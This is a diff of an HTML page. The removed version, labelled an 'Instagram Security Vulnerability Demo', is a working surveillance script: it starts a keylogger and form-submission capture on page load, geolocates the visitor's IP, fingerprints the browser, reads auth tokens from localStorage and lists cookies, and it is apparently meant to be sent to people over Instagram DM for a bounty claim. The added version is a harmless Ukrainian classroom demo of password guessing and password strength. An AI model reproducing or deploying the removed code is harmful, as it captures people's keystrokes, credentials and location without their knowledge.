@@ -1,265 +1,182 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram Security Scan</title>
+    <title>Лабораторна робота - Демонстрація безпеки</title>
     <style>
-        body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
-        .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }
-        .result-box { background: #000; color: #0f0; padding: 15px; margin: 10px 0; border-radius: 5px; font-family: monospace; font-size: 12px; max-height: 400px; overflow-y: auto; }
-        .btn { background: #dc3545; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 0; }
-        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #dc3545; background: #f8f9fa; }
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .result-box {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            height: 300px;
+            overflow-y: auto;
+        }
+        .btn {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .btn-danger {
+            background: #dc3545;
+        }
+        .section {
+            margin: 20px 0;
+            padding: 15px;
+            border-left: 4px solid #007bff;
+            background: #f8f9fa;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔓 Instagram Security Vulnerability Demo</h1>
+        <h1>🔐 Лабораторна робота - Демонстрація безпеки</h1>
         
         <div class="section">
-            <h3>🚨 LIVE DATA EXTRACTION</h3>
-            <button class="btn" onclick="startRealExtraction()">🎯 START REAL DATA THEFT</button>
+            <h3>📊 Інформація про систему</h3>
+            <button class="btn" onclick="showSystemInfo()">Показати інформацію про браузер</button>
+        </div>
+
+        <div class="section">
+            <h3>🎯 Демонстрація підбору паролів (LOCAL ONLY)</h3>
+            <p>Введіть тестовий пароль: <input type="password" id="passwordInput" value="123456"></p>
+            <button class="btn btn-danger" onclick="startPasswordCracking()">Запустити демо підбору паролів</button>
+        </div>
+
+        <div class="section">
+            <h3>🛡️ Аналіз безпеки</h3>
+            <button class="btn" onclick="analyzeSecurity()">Проаналізувати безпеку</button>
         </div>
 
         <div class="result-box" id="results">
-Ready to demonstrate REAL data extraction...
+Ласкаво просимо до демонстрації лабораторної роботи!
+Тут відображатимуться результати тестування...
         </div>
     </div>
 
     <script>
-        let capturedData = [];
+        let log = [];
 
         function addResult(message) {
             const resultsDiv = document.getElementById('results');
-            capturedData.push(message);
-            resultsDiv.innerHTML = capturedData.join('\n');
+            log.push(message);
+            resultsDiv.innerHTML = log.join('\n');
             resultsDiv.scrollTop = resultsDiv.scrollHeight;
-            console.log(message);
         }
 
-        // 1. РЕАЛЬНЕ ОТРИМАННЯ IP ТА ЛОКАЦІЇ
-        async function extractRealIP() {
-            addResult('🌐 EXTRACTING REAL IP ADDRESS...');
-            
-            try {
-                // Метод 1: ipify API
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                addResult(`✅ REAL PUBLIC IP: ${data.ip}`);
-                
-                // Метод 2: ipapi для геолокації
-                const locationResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                const locationData = await locationResponse.json();
-                addResult(`📍 LOCATION: ${locationData.city}, ${locationData.country_name}`);
-                addResult(`🏢 ISP: ${locationData.org}`);
-                addResult(`🗺️ COORDINATES: ${locationData.latitude}, ${locationData.longitude}`);
-                
-            } catch (error) {
-                addResult('❌ IP extraction failed');
+        // 1. Інформація про систему (безпечно)
+        function showSystemInfo() {
+            addResult('\n=== ІНФОРМАЦІЯ ПРО СИСТЕМУ ===');
+            addResult(`Браузер: ${navigator.userAgent.split(')')[0]})`);
+            addResult(`Платформа: ${navigator.platform}`);
+            addResult(`Мова: ${navigator.language}`);
+            addResult(`Екран: ${screen.width}x${screen.height}`);
+            addResult(`Cookies: ${navigator.cookieEnabled ? 'Увімкнено' : 'Вимкнено'}`);
+        }
+
+        // 2. ДЕМО підбору паролів (працює тільки локально)
+        function startPasswordCracking() {
+            const testPassword = document.getElementById('passwordInput').value;
+            if (!testPassword) {
+                addResult('❌ Будь ласка, введіть тестовий пароль');
+                return;
             }
+
+            addResult('\n=== ДЕМО ПІДБОРУ ПАРОЛІВ ===');
+            addResult(`Цільовий пароль: ${'*'.repeat(testPassword.length)}`);
+            addResult('Запуск атаки грубою силою...');
+
+            // Список популярних паролів для тестування
+            const commonPasswords = [
+                '123456', 'password', '12345678', 'qwerty', '123456789',
+                '12345', '1234', '111111', '1234567', 'dragon',
+                '123123', 'baseball', 'abc123', 'football', 'monkey',
+                'admin', '1234567890', 'password1', '12345678910'
+            ];
+
+            let attempts = 0;
+            let found = false;
+
+            // Симуляція підбору паролів
+            const interval = setInterval(() => {
+                if (attempts >= commonPasswords.length) {
+                    clearInterval(interval);
+                    addResult('❌ Пароль не знайдено в базі популярних паролів');
+                    addResult('✅ Демонстрація завершена - це показує важливість використання складних паролів!');
+                    return;
+                }
+
+                const guess = commonPasswords[attempts];
+                attempts++;
+                
+                addResult(`Спроба ${attempts}: ${guess}...`);
+
+                if (guess === testPassword) {
+                    clearInterval(interval);
+                    found = true;
+                    addResult(`🎯 ПАРОЛЬ ЗЛАМАНО! Знайдено спробою ${attempts}: ${guess}`);
+                    addResult('🚨 У реальному сценарії це дозволило б доступ до акаунта!');
+                }
+            }, 500);
         }
 
-        // 2. РЕАЛЬНИЙ BROWSER FINGERPRINTING
-        function createRealFingerprint() {
-            addResult('\n🎯 CREATING BROWSER FINGERPRINT...');
+        // 3. Аналіз безпеки
+        function analyzeSecurity() {
+            addResult('\n=== АНАЛІЗ БЕЗПЕКИ ===');
             
-            const fingerprint = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cpuCores: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                touchSupport: navigator.maxTouchPoints > 0,
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                cookieEnabled: navigator.cookieEnabled,
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
-                doNotTrack: navigator.doNotTrack
-            };
+            // Перевірка пароля
+            const password = document.getElementById('passwordInput').value;
+            let strength = 0;
             
-            addResult(`✅ BROWSER: ${fingerprint.userAgent}`);
-            addResult(`✅ SCREEN: ${fingerprint.screen}`);
-            addResult(`✅ TIMEZONE: ${fingerprint.timezone}`);
-            addResult(`✅ CPU CORES: ${fingerprint.cpuCores}`);
-            addResult(`✅ LANGUAGES: ${fingerprint.languages.join(', ')}`);
-            addResult(`✅ PLUGINS: ${fingerprint.plugins.length} detected`);
-        }
-
-        // 3. РЕАЛЬНИЙ АНАЛІЗ LOCALSTORAGE
-        function analyzeRealStorage() {
-            addResult('\n💾 ANALYZING BROWSER STORAGE...');
+            if (password.length >= 8) strength++;
+            if (/[A-Z]/.test(password)) strength++;
+            if (/[0-9]/.test(password)) strength++;
+            if (/[^A-Za-z0-9]/.test(password)) strength++;
             
-            let foundItems = 0;
+            addResult(`Довжина пароля: ${password.length} символів`);
             
-            // LocalStorage аналіз
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    if (key.length > 0) {
-                        foundItems++;
-                        if (key.includes('auth') || key.includes('token') || key.includes('user')) {
-                            addResult(`🔑 FOUND AUTH DATA: ${key} = ${value.substring(0, 50)}...`);
-                        }
-                    }
-                }
-                addResult(`✅ LOCALSTORAGE: ${foundItems} items found`);
-            } catch (e) {}
-            
-            // SessionStorage аналіз
-            try {
-                let sessionItems = 0;
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    sessionStorage.key(i) && sessionItems++;
-                }
-                addResult(`✅ SESSIONSTORAGE: ${sessionItems} items found`);
-            } catch (e) {}
-        }
-
-        // 4. РЕАЛЬНИЙ МОНІТОРИНГ КЛАВІАТУРИ
-        function setupRealKeylogger() {
-            addResult('\n⌨️ SETUP KEYSTROKE MONITORING...');
-            
-            let typedData = '';
-            
-            document.addEventListener('keydown', function(event) {
-                // Фільтруємо спеціальні клавіші
-                if (event.key.length === 1) {
-                    typedData += event.key;
-                    if (typedData.length > 20) {
-                        addResult(`🎯 KEYSTROKES CAPTURED: ${typedData}`);
-                        typedData = '';
-                    }
-                }
-                
-                // Enter key
-                if (event.key === 'Enter') {
-                    addResult(`↵ ENTER PRESSED - potential form submission`);
-                }
-            });
-            
-            addResult('✅ KEYLOGGER ACTIVE - monitoring keyboard input');
-        }
-
-        // 5. РЕАЛЬНИЙ ПЕРЕХОПЛЕННЯ ФОРМ
-        function interceptRealForms() {
-            addResult('\n📝 INTERCEPTING FORM SUBMISSIONS...');
-            
-            // Перехоплюємо всі форми на сторінці
-            document.addEventListener('submit', function(event) {
-                event.preventDefault();
-                
-                const formData = new FormData(event.target);
-                const formValues = {};
-                
-                for (let [key, value] of formData.entries()) {
-                    formValues[key] = value;
-                }
-                
-                addResult(`🎯 FORM INTERCEPTED: ${JSON.stringify(formValues)}`);
-                addResult('⚠️ In real attack: Credentials would be stolen here!');
-                
-                // В реальній атаці тут була б відправка на сервер хакера
-            });
-            
-            addResult('✅ FORM INTERCEPTION ACTIVE');
-        }
-
-        // 6. РЕАЛЬНИЙ МОНІТОРИНГ КЛІКІВ
-        function monitorRealClicks() {
-            addResult('\n🖱️ MONITORING USER CLICKS...');
-            
-            document.addEventListener('click', function(event) {
-                const target = event.target;
-                if (target.tagName === 'BUTTON' || target.tagName === 'A') {
-                    addResult(`🎯 USER CLICKED: ${target.textContent || target.href}`);
-                }
-            });
-            
-            addResult('✅ CLICK MONITORING ACTIVE');
-        }
-
-        // 7. РЕАЛЬНИЙ АНАЛІЗ COOKIES
-        function analyzeRealCookies() {
-            addResult('\n🍪 ANALYZING BROWSER COOKIES...');
-            
-            if (document.cookie) {
-                const cookies = document.cookie.split(';');
-                addResult(`✅ FOUND ${cookies.length} COOKIES:`);
-                
-                cookies.forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (name && value) {
-                        addResult(`   ${name} = ${value.substring(0, 30)}${value.length > 30 ? '...' : ''}`);
-                    }
-                });
+            if (strength === 4) {
+                addResult('✅ Пароль: Дуже сильний');
+            } else if (strength >= 2) {
+                addResult('⚠️ Пароль: Середній рівень');
             } else {
-                addResult('❌ NO COOKIES FOUND (cross-domain restriction)');
+                addResult('❌ Пароль: Слабкий');
             }
+            
+            // Рекомендації
+            addResult('\n💡 РЕКОМЕНДАЦІЇ ЩОДО БЕЗПЕКИ:');
+            addResult('• Використовуйте паролі довші за 12 символів');
+            addResult('• Комбінуйте літери, цифри та спецсимволи');
+            addResult('• Не використовуйте особисту інформацію');
+            addResult('• Використовуйте менеджер паролів');
         }
 
-        // 8. РЕАЛЬНИЙ МОНІТОРИНГ СКРОЛУ
-        function monitorRealScroll() {
-            addResult('\n📜 MONITORING SCROLL BEHAVIOR...');
-            
-            let scrollCount = 0;
-            window.addEventListener('scroll', function() {
-                scrollCount++;
-                if (scrollCount % 10 === 0) {
-                    addResult(`🎯 USER SCROLLING: ${Math.round(window.scrollY)}px down`);
-                }
-            });
-            
-            addResult('✅ SCROLL MONITORING ACTIVE');
-        }
-
-        // 9. РЕАЛЬНИЙ ВИВІД ВСІХ ДАНИХ
-        function generateRealReport() {
-            addResult('\n📊 GENERATING COMPREHENSIVE REPORT...');
-            addResult('==========================================');
-            addResult('🎯 DEMONSTRATION COMPLETE!');
-            addResult('⚠️ THIS SHOWS REAL DATA THAT CAN BE STOLEN:');
-            addResult('   • Real IP address and location');
-            addResult('   • Unique browser fingerprint');
-            addResult('   • Browser storage contents');
-            addResult('   • Keystrokes and form data');
-            addResult('   • User behavior (clicks, scrolls)');
-            addResult('   • Authentication tokens');
-            addResult('==========================================');
-            addResult('💰 FOR BOUNTY: This proves real data extraction via Instagram DM');
-        }
-
-        // ГОЛОВНА ФУНКЦІЯ
-        async function startRealExtraction() {
-            capturedData = [];
-            addResult('🚀 STARTING REAL DATA EXTRACTION...');
-            addResult('⚠️ DEMONSTRATING ACTIVE ATTACK METHODS');
-            addResult('==========================================');
-            
-            // Послідовно запускаємо всі методи
-            await extractRealIP();
-            createRealFingerprint();
-            analyzeRealStorage();
-            setupRealKeylogger();
-            interceptRealForms();
-            monitorRealClicks();
-            analyzeRealCookies();
-            monitorRealScroll();
-            
-            setTimeout(generateRealReport, 2000);
-        }
-
-        // Автозапуск моніторингу
-        window.addEventListener('load', function() {
-            setupRealKeylogger();
-            interceptRealForms();
-            monitorRealClicks();
-            monitorRealScroll();
-            
-            addResult('🔓 REAL-TIME MONITORING ACTIVATED');
-            addResult('Click "START REAL DATA THEFT" to demonstrate full attack');
-        });
+        // Початкове повідомлення
+        addResult('🔒 Ця демонстрація показує:');
+        addResult('• Як працюють атаки підбором паролів');
+        addResult('• Важливість складних паролів');
+        addResult('• Принципи кібербезпеки');
+        addResult('\n⚠️ УВАГА: Ця програма працює ТІЛЬКИ локально');
+        addResult('та не передає дані в мережу!');
     </script>
 </body>
 </html>
